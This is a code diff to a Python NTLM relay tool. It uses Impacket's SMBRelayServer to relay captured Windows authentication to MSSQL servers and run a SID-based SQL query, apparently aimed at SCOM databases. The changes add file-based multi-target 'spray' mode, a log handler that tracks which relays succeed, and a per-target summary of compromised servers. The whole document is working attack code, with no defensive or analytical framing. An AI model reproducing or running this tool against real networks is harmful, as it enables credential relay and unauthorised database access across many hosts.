@@ -1,12 +1,15 @@
 import time
 import logging
-from threading import Lock
+import sys
+import io
+from threading import Lock, Thread
+from contextlib import redirect_stdout, redirect_stderr
 
 from impacket.examples.ntlmrelayx.servers import SMBRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.ldap import ldaptypes
-from impacket import LOG as impacket_logger
+from impacket.examples import logger as impacket_logger
 
 # Import the pre-populated protocol clients and attacks dictionaries
 from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
@@ -15,10 +18,49 @@ from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
 from lib.logger import logger
 
 
+class RelayResultHandler(logging.Handler):
+    """Custom logging handler to capture Impacket's relay messages and track results"""
+    def __init__(self, relay_instance):
+        super().__init__()
+        self.relay = relay_instance
+        
+    def emit(self, record):
+        try:
+            msg = self.format(record)
+            
+            # Check for success/failure messages in Impacket's output
+            if "Executing SQL:" in msg and "mssql://" in msg:
+                # Extract target from message
+                for target in self.relay.targets_list:
+                    if target in msg:
+                        logger.info(f"[+] {target} - Query executing...")
+                        break
+            
+            elif "SUCCEED" in msg and "mssql://" in msg:
+                # Authentication succeeded
+                for target in self.relay.targets_list:
+                    if target in msg:
+                        self.relay.target_results[target] = "SUCCESS"
+                        logger.info(f"[+] {target} - Query executed successfully")
+                        break
+            
+            elif ("FAILED" in msg or "ERROR" in msg) and "mssql://" in msg:
+                # Authentication or query failed
+                for target in self.relay.targets_list:
+                    if target in msg:
+                        self.relay.target_results[target] = "FAILED"
+                        logger.info(f"[-] {target} - Operation failed")
+                        break
+                        
+        except Exception:
+            pass
+
+
 class MSSQLSCOMRELAY:
-    def __init__(self, target: str, sid: str, interface: str, port: int, 
+    def __init__(self, target: str, target_file: str, sid: str, interface: str, port: int, 
                  timeout: int, operation_mode: str, verbose: bool):
         self.target = target
+        self.target_file = target_file
         self.sid = sid
         self.interface = interface
         self.port = port
@@ -26,25 +68,52 @@ class MSSQLSCOMRELAY:
         self.operation_mode = operation_mode
         self.verbose = verbose
         self.attacked_targets = []
+        self.target_results = {}  # Track results per target
         self.attack_lock = Lock()
         self.server = None
         self.query = None
+        self.targets_list = []
 
         # Build the appropriate SQL query based on operation mode
         self.query = self.build_query()
 
-        # Ensure target has proper format
-        if not self.target.startswith("mssql://"):
-            self.target = f"mssql://{self.target}"
-        
-        logger.info(f"Targeting MSSQL server at {self.target}")
-        logger.info(f"Operation mode: {self.operation_mode}")
+        # Load targets
+        if self.target_file:
+            self.targets_list = self.load_targets_from_file(self.target_file)
+            logger.info(f"Loaded {len(self.targets_list)} targets from file")
+            logger.info(f"Operation mode: {self.operation_mode}")
+        else:
+            # Single target mode
+            if not self.target.startswith("mssql://"):
+                self.target = f"mssql://{self.target}"
+            self.targets_list = [self.target]
+            logger.info(f"Targeting MSSQL server at {self.target}")
+            logger.info(f"Operation mode: {self.operation_mode}")
+
+        # Initialize result tracking
+        for target in self.targets_list:
+            self.target_results[target] = "WAITING"
 
         # Set up the relay configuration using Impacket's protocol dictionaries
-        target_processor = TargetsProcessor(
-            singleTarget=self.target,
-            protocolClients=PROTOCOL_CLIENTS
-        )
+        if len(self.targets_list) == 1:
+            target_processor = TargetsProcessor(
+                singleTarget=self.targets_list[0],
+                protocolClients=PROTOCOL_CLIENTS
+            )
+        else:
+            # Multi-target mode - create a temporary file for TargetsProcessor
+            import tempfile
+            import os
+            temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
+            for t in self.targets_list:
+                temp_file.write(f"{t}\n")
+            temp_file.close()
+            self.temp_targets_file = temp_file.name
+            
+            target_processor = TargetsProcessor(
+                targetListFile=self.temp_targets_file,
+                protocolClients=PROTOCOL_CLIENTS
+            )
 
         config = NTLMRelayxConfig()
         config.setTargets(target_processor)
@@ -70,6 +139,23 @@ class MSSQLSCOMRELAY:
         self.server = SMBRelayServer(config)
         if self.verbose:
             logger.info("[DEBUG] SMBRelayServer created successfully")
+
+    def load_targets_from_file(self, filepath):
+        """Load targets from file, one per line"""
+        targets = []
+        try:
+            with open(filepath, 'r') as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith('#'):
+                        # Ensure proper format
+                        if not line.startswith("mssql://"):
+                            line = f"mssql://{line}"
+                        targets.append(line)
+            return targets
+        except Exception as e:
+            logger.info(f"Error loading targets from file: {str(e)}")
+            return []
 
     def convert_string_sid(self, sid):
         """Convert string SID to hex format for SQL query"""
@@ -118,8 +204,13 @@ class MSSQLSCOMRELAY:
             logger.info("Error: Failed to build SQL query. Exiting.")
             return
 
-        # Configure Impacket's logger to show relay messages
-        impacket_logger.setLevel(logging.INFO)
+        # Configure Impacket's logger and add our custom handler
+        impacket_logger.init(ts=False, debug=self.verbose)
+        
+        # Add custom handler to track results for multi-target mode
+        if len(self.targets_list) > 1:
+            result_handler = RelayResultHandler(self)
+            logging.getLogger().addHandler(result_handler)
         
         logger.info(f"Listening on {self.interface}:{self.port}")
         logger.info("Waiting for incoming connections...")
@@ -157,6 +248,47 @@ class MSSQLSCOMRELAY:
             import traceback
             logger.info(f"[ERROR] Traceback:\n{traceback.format_exc()}")
 
+    def print_summary(self):
+        """Print summary of results for multi-target mode"""
+        if len(self.targets_list) <= 1:
+            return  # No summary needed for single target
+        
+        logger.info("\n" + "=" * 60)
+        logger.info("SPRAY SUMMARY")
+        logger.info("=" * 60)
+        
+        successful = [t for t, status in self.target_results.items() if status == "SUCCESS"]
+        failed = [t for t, status in self.target_results.items() if status == "FAILED"]
+        waiting = [t for t, status in self.target_results.items() if status == "WAITING"]
+        
+        logger.info(f"Successful: {len(successful)}/{len(self.targets_list)} targets")
+        if successful:
+            for target in successful:
+                logger.info(f"  [+] {target}")
+        
+        if failed:
+            logger.info(f"\nFailed: {len(failed)}/{len(self.targets_list)} targets")
+            for target in failed:
+                logger.info(f"  [-] {target}")
+        
+        if waiting:
+            logger.info(f"\nNo authentication received: {len(waiting)}/{len(self.targets_list)} targets")
+            for target in waiting:
+                logger.info(f"  [*] {target}")
+        
+        logger.info("=" * 60)
+
     def shutdown(self):
+        # Clean up temp file if it exists
+        if hasattr(self, 'temp_targets_file'):
+            try:
+                import os
+                os.unlink(self.temp_targets_file)
+            except:
+                pass
+        
+        # Print summary for multi-target mode
+        self.print_summary()
+        
         logger.info("Job done...")
         exit()
